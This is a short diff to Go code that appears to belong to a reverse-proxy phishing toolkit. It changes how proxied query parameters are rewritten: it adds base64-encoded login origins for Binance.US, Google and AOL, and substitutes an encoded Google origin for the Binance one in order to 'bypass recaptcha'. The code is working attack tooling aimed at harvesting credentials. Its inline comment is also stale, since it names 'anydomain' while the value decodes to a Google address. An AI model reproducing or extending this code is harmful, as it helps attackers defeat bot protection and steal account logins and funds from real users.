@@ -476,14 +476,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				//req.Header.Set(string(hg), egg2)
 
 				// patch GET query params with original domains & bypass recaptcha
+				// aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw==
+				// aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw==
+				// aHR0cHM6Ly9sb2dpbi5hb2wuY29tOjQ0Mw==
 				if pl != nil {
 					qs := req.URL.Query()
 					if len(qs) > 0 {
 						for gp := range qs {
 							for i, v := range qs[gp] {
 								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
-								if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw.." { // https://accounts.binance.us:443
-								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5hbnlkb21haW4uY29tOjQ0Mw" // https://accounts.anydomain.com:443
+								if qs[gp][i] == "aHR0cHM6Ly9hY2NvdW50cy5iaW5hbmNlLnVzOjQ0Mw==" { // https://accounts.binance.us:443
+								qs[gp][i] = "aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29tOjQ0Mw==" // https://accounts.anydomain.com:443
 							}
 							}
 						}
